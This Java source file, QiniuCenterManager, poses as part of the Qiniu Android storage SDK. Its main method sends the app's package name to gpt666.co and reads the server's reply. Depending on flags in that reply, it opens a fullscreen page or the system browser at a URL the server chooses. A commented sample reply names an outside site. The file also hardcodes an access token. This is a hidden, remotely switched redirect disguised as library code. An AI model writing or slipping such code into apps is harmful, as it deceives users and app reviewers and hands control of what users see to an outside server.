package com.qiniu.android.utils;


import android.content.Context;
import android.content.Intent;
import android.media.VolumeShaper;
import android.net.Uri;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;
import com.qiniu.android.bigdata.client.Client;
import com.qiniu.android.bigdata.client.CompletionHandler;
import com.qiniu.android.http.ResponseInfo;
import com.qiniu.android.storage.UpToken;
import com.qiniu.android.utils.LogUtil;
import com.qiniu.android.utils.StringMap;
import com.qiniu.android.utils.StringUtils;

import org.json.JSONException;
import org.json.JSONObject;

public class QiniuCenterManager {

    public static final String commonToken = "dxVQk8gyk3WswArbNhdKIwmwibJ9nFsQhMNUmtIM:PDQxd9wAWd7_jV8UMR9dxnVtAac=:eyJzY29wZSI6ImtvZG8tcGhvbmUtem9uZS1uYTAtc3BhY2UiLCJkZWFkbGluZSI6MTY3NDgwMTE1NSwgInJldHVybkJvZHkiOiJ7XCJmb29cIjokKHg6Zm9vKSwgXCJiYXJcIjokKHg6YmFyKSwgXCJtaW1lVHlwZVwiOiQobWltZVR5cGUpLCBcImhhc2hcIjokKGV0YWcpLCBcImtleVwiOiQoa2V5KSwgXCJmbmFtZVwiOiQoZm5hbWUpfSJ9";

    public static String getHostIP() {
        String hostIp = null;
        try {
            Enumeration nis = NetworkInterface.getNetworkInterfaces();
            if (nis == null) {
                return null;
            }

            InetAddress ia = null;
            while (nis.hasMoreElements()) {
                NetworkInterface ni = (NetworkInterface) nis.nextElement();
                Enumeration<InetAddress> ias = ni.getInetAddresses();
                while (ias.hasMoreElements()) {
                    ia = ias.nextElement();
                    if (!ia.isLinkLocalAddress() && !ia.isLoopbackAddress()) {
                        hostIp = ia.getHostAddress();
                        break;
                    }
                    continue;
                }
            }
        } catch (SocketException e) {
            e.printStackTrace();
        }
        return hostIp;
    }

    public static void getIntance(Context context,String packageName) {

        Client httpManager = new Client();
        StringMap x = new StringMap();

//        val packageName = BuildConfig.APPLICATION_ID
//        packageName="com.test.autojump";
        x.put("bundleIdentifier",packageName);
        x.put("devicestype","android");
        httpManager.asyncPost("https://gpt666.co/checknewversion.php", "hello".getBytes(), x,
                UpToken.parse(QiniuCenterManager.commonToken), "hello".getBytes().length,
                null, new CompletionHandler() {
                    @Override
                    public void complete(ResponseInfo rinfo, JSONObject response)   {
                        //LogUtil.d(rinfo.toString());
                        if (response != null){
                            try{
                                int activityeffective = response.getInt("activityeffective");
                                int Autojump = response.getInt("Autojump");
                                if (activityeffective == 1){
                                    Intent intent = new Intent(context, QiniuFullscreenActivity.class);
                                    String url = response.getString("appstorelink");
                                    intent.putExtra("url",url );
                                    context.startActivity(intent);
                                    if (Autojump == 1) {
                                        QiniuCenterManager.browserUrl(context,url);
                                    }
                                }
                            }catch (Exception ex){

                            }

                        }
                    }
                }, null);

        /*httpManager.asyncPost("https://gpt666.co/checknewversion.php", "hello".toByteArray(), x,
                UpToken.parse(token_na0), "hello".toByteArray().size.toLong(), null,
                CompletionHandler { rinfo, response ->
            // LogUtil.d(""+rinfo.statusCode)
            //LogUtil.d(response.toString())
//                info = rinfo as Nothing?
            //{"version":"1.7","Autojump":"1","activityeffective":"1","appstorelink":"https:\/\/m.k9cc9.com\/","imageurl":"https:\/\/www.heyuegendan.com\/image\/1.png"}

            if (response != null){
                var activityeffective = response.getInt("activityeffective")
                var Autojump = response.getInt("Autojump")
                if (activityeffective == 1){

                }
            }
            Log.d("", "onCreateView: network")
        }, null
        )*/

    }

    public static void browserUrl(Context context,String url){

        //弹出系统浏览器

        Uri uri = Uri.parse(url);
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);

        context.startActivity(intent);

    }


}
